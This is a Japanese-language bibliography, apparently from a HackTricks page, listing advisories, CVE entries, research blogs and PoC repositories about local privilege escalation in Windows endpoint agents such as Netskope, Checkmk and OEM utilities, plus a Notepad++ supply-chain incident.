- [1] [アドバイザリ – Netskope Client for Windows – Rogue Server を介したローカル権限昇格 (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope セキュリティアドバイザリ NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – ASUS DriverHub、MSI Center、Acer Control Centre、Razer Synapse 4 の侵害](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Checkmk Agent の書き込み可能なファイルを介したローカル権限昇格](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Windows agent の権限昇格](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn の PoC](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – 国家支援型攻撃者による Notepad++ サプライチェーンの悪用](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – hijacked インフラストラクチャに関するインシデント更新情報](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Netskope Client for Windows における CVE-2025-0309 の修正回避](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Lenovo Vantage の権限昇格バグの発見](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
{{#include ../../banners/hacktricks-training.md}}
